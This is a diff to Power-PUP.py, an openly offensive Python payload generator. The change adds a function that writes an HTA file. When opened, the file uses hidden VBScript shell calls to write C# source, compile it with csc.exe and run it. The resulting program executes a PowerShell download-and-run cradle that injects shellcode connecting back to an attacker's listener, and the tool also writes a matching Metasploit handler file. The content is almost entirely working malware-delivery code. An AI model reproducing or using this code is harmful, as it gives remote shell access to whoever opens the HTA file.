@@ -3,7 +3,7 @@
 #-Metadata------------------------------------------------------#
 #  Filename: Power-PUP.py                                       #
 #  Released: 2016-07-26                                         #
-#  Updated: 2016-07-30                                          #
+#  Updated: 2016-07-31                                          #
 #                                                               #
 #-Info----------------------------------------------------------#
 #  Powershell Universal Programmer (Power-PUP.py) is a Windows  #
@@ -63,7 +63,7 @@ from sys import argv
 
 name = "Powershell Universal Programmer"
 shrtname = " (Power-PUP.py)"
-__version__ = "1.6"
+__version__ = "1.7"
 
 
 banner = '''
@@ -151,11 +151,12 @@ def shell_quick(shellcode,location,lhost,lport,payload):
     
     ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Shellcode -Payload " + payload + " -Lhost " + lhost + " -Lport " + lport + " -force"
     print '\nSHELLCODE'
-    print '   PAYLOAD: ' + payload
-    print '   LHOST: ' + lhost
-    print '   LPORT: ' + lport
+    print '   PAYLOAD      : ' + payload
+    print '   LHOST        : ' + lhost
+    print '   LPORT        : ' + lport
     print 
     print '   Resource file: handler.rc'
+    print '   HTA File     : pup.hta'
     print
 
     # create msf rc file
@@ -163,6 +164,7 @@ def shell_quick(shellcode,location,lhost,lport,payload):
         f.write("\#\n\# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r 'handler.rc'\n\#\nuse exploit/multi/handler\nset PAYLOAD " + payload + "\nset LHOST " + lhost + "\nset LPORT " + lport + "\nset ExitOnSession false\nrun -j")
         f.close
 
+    create_hta(ps_script)
     return ps_script
 
 def enter_ps():
@@ -211,6 +213,27 @@ def compile_exe(arch,out_exe):
         dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"
 
     os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs"')
+
+
+def create_hta(ps_script):
+    # create hta file
+
+    with open('pup.hta', 'w') as f:
+        f.write('<html>\n<head>\n<script language="VBScript">\n    Set objShell1 = CreateObject("Wscript.Shell")\n    Set objShell2 = CreateObject("Wscript.Shell")\n    Set objShell3 = CreateObject("Wscript.Shell")\n    Set objShell4 = CreateObject("Wscript.Shell")\n    Set objShell5 = CreateObject("Wscript.Shell")\n    Set objShell6 = CreateObject("Wscript.Shell")\n    objShell1.Run "cmd.exe /c echo using System; > c:\\users\\public\\temp.cs && echo using System.Collections.ObjectModel; >> c:\\users\\public\\temp.cs && echo using System.Management.Automation; >> c:\\users\\public\\temp.cs && echo using System.Management.Automation.Runspaces; >> c:\\users\\public\\temp.cs && echo namespace pup >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo class Program >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo static void Main(string[] args) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo PowerShell ps = PowerShell.Create(); >> c:\\users\\public\\temp.cs')
+        f.write('&& echo String script1 = ""' + ps_script + '""; >> c:\\users\\public\\temp.cs && echo ps.AddScript(script1); >> c:\\users\\public\\temp.cs",0')
+        f.write('\n    objShell2.Run "cmd.exe /c echo Collection^<PSObject^> output = null; >> c:\\users\\public\\temp.cs && echo try >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo output = ps.Invoke(); >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo catch(Exception e) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo Console.WriteLine(""Error while executing the script.\\r\\n"" + e.Message.ToString()); >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo if (output != null) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs')
+        f.write('&& echo foreach (PSObject rtnItem in output) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo Console.WriteLine(rtnItem.ToString()); >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs",0')
+        f.write('\n    objshell3.Run "cmd.exe /c C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /unsafe /reference:""C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll"" /reference:System.IO.Compression.dll /out:c:\\users\\public\\pup.exe /platform:x86 ""c:\\users\\public\\temp.cs""')
+        f.write('&& c:\\users\\public\\pup.exe",0')
+        f.write('\n</script> \n</head> \n<body> \n<!-- info -->\n</body> \n</html>')
+        f.close
+
+
+
+
+
+
+
 
 
 def usage():
